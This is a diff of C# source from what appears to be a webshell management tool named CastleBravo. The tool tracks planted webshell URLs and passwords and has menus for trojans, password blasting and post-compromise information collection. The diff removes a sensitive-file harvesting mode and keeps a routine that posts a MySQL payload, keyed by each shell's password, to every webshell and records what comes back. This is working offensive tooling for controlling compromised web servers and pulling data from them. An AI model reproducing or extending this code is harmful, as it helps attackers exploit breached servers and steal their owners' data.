@@ -17,16 +17,8 @@ namespace C2.Business.CastleBravo.WebShellTool
         public static ProxySetting Proxy { get; set; } = ProxySetting.Empty;
         public static InfoCollectionSetting InfoCollectionConfig { get; set; } = InfoCollectionSetting.Empty;
         private int NumberOfAlive { get; set; }
-        private int NumberOfsuccessful { get; set; }
         private int NumberOfHost { get => setOfHost.Count; }
         private int NumberOfIPAddress { get => setOfIPAddress.Count; }
-        public InfoType InfoCollectionType { get; set; } = InfoType.Empty;
-        public enum InfoType
-        {
-            Mysql,
-            SensitiveFile,
-            Empty
-        }
 
         private HashSet<string> setOfIPAddress;
         private HashSet<string> setOfHost;
@@ -71,9 +63,6 @@ namespace C2.Business.CastleBravo.WebShellTool
                 this.trojanMenu,
                 this.infoCollectionMenu,
                 this.passwdBlastingMenuItem,
-                this.sensitiveFileScanMenuItem,
-                this.allTaskFileMenuItem,
-                this.aliveTaskFileMenuItem,
                 this.allTaskMysqlMenuItem,
                 this.aliveTaskMysqlMenuItem
             };
@@ -342,7 +331,6 @@ namespace C2.Business.CastleBravo.WebShellTool
             this.progressBar.Maximum = LV.Items.Count;
             this.refreshNeedStop = false;
             this.NumberOfAlive = 0;
-            this.NumberOfsuccessful = 0;
             this.setOfIPAddress.Clear();
             this.setOfHost.Clear();
         }
@@ -366,23 +354,12 @@ namespace C2.Business.CastleBravo.WebShellTool
         }
         private void UpdateProgress()
         {
-            if (!InfoCollectionType.Equals(InfoType.Empty))
-            {
-                this.progressMenu.Text = string.Format("{0}/{1} - 成功 {2}",
-                    ++progressBar.Value,
-                    progressBar.Maximum,
-                    NumberOfsuccessful);
-            }
-            else
-            {
-                this.progressMenu.Text = string.Format("{0}/{1} - 活 {2} - 站 {3} - IP {4}",
-                    ++progressBar.Value,
-                    progressBar.Maximum,
-                    NumberOfAlive,
-                    NumberOfHost,
-                    NumberOfIPAddress);
-            }
-
+            this.progressMenu.Text = string.Format("{0}/{1} - 活 {2} - 站 {3} - IP {4}",
+                ++progressBar.Value,
+                progressBar.Maximum,
+                NumberOfAlive,
+                NumberOfHost,
+                NumberOfIPAddress);
         }
 
         private static void ClearAliveItems(ListViewItem lvi)
@@ -418,7 +395,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private bool PostCollectInfo(WebShellTaskConfig task)
         {
-            return DoEventsWait(90, Task.Run(() => CollectInfo(task)));
+            return DoEventsWait(90, Task.Run(() => PostMysqlBlastingRequest(task)));
         }
 
         private static bool DoEventsWait(int timeout, Task<bool> t)
@@ -472,69 +449,20 @@ namespace C2.Business.CastleBravo.WebShellTool
             catch { return false; }
 
         }
-        private bool CollectInfo(WebShellTaskConfig task)
+        private bool PostMysqlBlastingRequest(WebShellTaskConfig task)
         {
-            string payload = string.Empty;
-
-            switch (InfoCollectionType)
-            {
-                case InfoType.Mysql:
-                    payload = string.Format("{0}={1};", task.Password, Global.MysqlPayload);
-                    break;
-                case InfoType.SensitiveFile:
-                    payload = string.Format("{0}={1};", task.Password, Global.SensitiveFilePayload);
-                    break;
-            }
             try
             {
-                string response = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 90000, Proxy);
-                switch (InfoCollectionType)
-                {
-                    case InfoType.Mysql:
-                        task.SGInfoCollectionConfig = response;
-                        break;
-                    case InfoType.SensitiveFile:
-                        task.SGInfoCollectionConfig = WriteResult(task.Url, response);
-                        break;
-                }
+                string payload = string.Format("{0}={1};", task.Password, Global.MysqlPayload);
+                task.SGInfoCollectionConfig = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 90000, Proxy);
             }
             catch (Exception ex)
             {
                 task.SGInfoCollectionConfig = ex.Message;
-                return false;
             }
             return true;
         }
-        private string WriteResult(string url, string result)
-        {
-            string[] array = url.Split('/');
-            if (array.Length < 4)
-                return string.Empty;
-
-            string file_name = array[2] + "_" + array[array.Length - 1] + ".html";
-            try
-            {
-                string path = Path.Combine(Global.UserWorkspacePath, "后信息采集");
-                Directory.CreateDirectory(path);
-                path += "\\" + file_name;
-                if (!File.Exists(path))
-                {
-                    FileStream fs1 = new FileStream(path, FileMode.Create);
-                    fs1.Close();
-                }
-                using (StreamWriter sw = new StreamWriter(path, false, System.Text.Encoding.UTF8))
-                {
-                    sw.WriteLine(result);
-                }
-                return path;
-
-            }
-            catch (Exception ex)
-            {
-                return ex.Message;
-            }
-
-        }
+        
         private void AddAllShellMenu_Click(object sender, EventArgs e)
         {
             AddAllWebShellForm dialog = new AddAllWebShellForm();
@@ -680,9 +608,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
                 WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
                 using (GuarderUtil.WaitCursor)
-                    if (PostCollectInfo(task))
-                        this.NumberOfsuccessful++;
-         
+                    PostCollectInfo(task);
                 lvi.SubItems[7].Text = task.SGInfoCollectionConfig;
                 UpdateProgress();
                 CheckSavePoint(); // 5分钟保存一次
@@ -692,43 +618,18 @@ namespace C2.Business.CastleBravo.WebShellTool
            
         private void AllTaskMysqlMenuItem_Click(object sender, EventArgs e)
         {
-            this.InfoCollectionType = InfoType.Mysql;
             RefreshInfoColletionStatus(false);
         }
         private void AliveTaskMysqlMenuItem_Click(object sender, EventArgs e)
         {
-            this.InfoCollectionType = InfoType.Mysql;
             RefreshInfoColletionStatus(true);
         }
-        private void AliveTaskFileMenuItem_Click(object sender, EventArgs e)
-        {
-            this.InfoCollectionType = InfoType.SensitiveFile;
-            RefreshInfoColletionStatus(true);
-        }
-        private void CleanResultFile(string path)
-        {
-            if (!Directory.Exists(path))
-                return;
-            foreach (string file in Directory.GetFileSystemEntries(path))
-            {
-                if (File.Exists(file))
-                {
-                    File.Delete(file);
-                }
-
-            }
-
-        }
-        private void AllTaskFileMenuItem_Click(object sender, EventArgs e)
-        {
-            this.InfoCollectionType = InfoType.SensitiveFile;
-            RefreshInfoColletionStatus(false);
-        }
-
+      
+      
         private void InfoCollectionSetMenuItem_Click(object sender, EventArgs e)
         {
             InfoCollectionConfig = new InfoCollectionSet(InfoCollectionConfig).ShowDialog();
-            ResetSLabel();
+            infoConfigEnable.Text = InfoCollectionConfig.Enable ? "后信息收集配置启用" : string.Empty;
         }
     }
 }
